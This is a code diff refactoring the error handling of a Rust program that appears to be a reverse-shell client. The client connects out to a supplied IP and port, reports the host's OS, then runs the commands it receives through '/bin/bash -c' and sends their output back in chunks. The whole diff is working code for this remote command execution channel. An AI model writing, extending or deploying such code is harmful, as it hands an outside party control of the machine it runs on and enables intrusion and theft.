@@ -9,11 +9,12 @@ pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
     let mut stream = TcpStream::connect(i.to_owned() + ":" + p)?;
 
     let os = std::env::consts::FAMILY;
-    let res = stream.write_all(os.as_bytes());
-
-    if res.is_err() {
-        println!("Error sending OS info : {}", res.err().unwrap());
-        exit(7);
+    match stream.write_all(os.as_bytes()) {
+        Ok(_) => (),
+        Err(e) => {
+            println!("Error sending OS info : {}", e);
+            exit(1);
+        }
     }
 
     loop {
@@ -63,51 +64,51 @@ fn handler(cmd: String, tls_stream: &mut TcpStream) -> HandlerStatus {
 }
 
 fn run_cmd(cmd: &String, tls_stream: &mut TcpStream) -> HandlerStatus {
-    let res = run(cmd);
-    if res.is_none() {
-        return HandlerStatus::CmdError;
-    }
-    let mut res = res.unwrap();
-    if res.is_empty() {
-        let status = tls_stream.write_all("\0".as_bytes());
-        if status.is_err() {
-            HandlerStatus::SendError
-        } else {
-            HandlerStatus::Ok
+    let mut out = match run(cmd) {
+        Some(o) => o,
+        None => return HandlerStatus::CmdError,
+    };
+
+    if out.is_empty() {
+        match tls_stream.write_all("\0".as_bytes()) {
+            Ok(_) => HandlerStatus::Ok,
+            Err(_) => HandlerStatus::SendError,
         }
     } else {
         let mut buff_to_send = [0; 4096];
         loop {
             let mut count = 0;
-            for c in &res {
+            for c in &out {
                 if count == 4096 {
                     break;
                 }
                 buff_to_send[count] = *c;
                 count += 1;
             }
-            let status = tls_stream.write(&buff_to_send);
-            if status.is_err() {
-                return HandlerStatus::SendError;
+
+            match tls_stream.write(&buff_to_send) {
+                Ok(_) => (),
+                Err(_) => return HandlerStatus::SendError,
             }
+
             buff_to_send = [0; 4096];
             if count < 4096 {
                 break;
             }
-            res = res.split_off(count);
+            out = out.split_off(count);
         }
         HandlerStatus::Ok
     }
 }
 
 fn run(cmd: &String) -> Option<Vec<u8>> {
-    let exec = Command::new("/bin/bash")
+    let exec = match Command::new("/bin/bash")
         .args(["-c", cmd.trim_end_matches("\r\n")])
-        .output();
-    if exec.is_err() {
-        return None;
-    }
-    let exec = exec.unwrap();
+        .output()
+    {
+        Ok(e) => e,
+        Err(_) => return None,
+    };
 
     let stdo = exec.stdout.as_slice();
     let stderr = exec.stderr.as_slice();
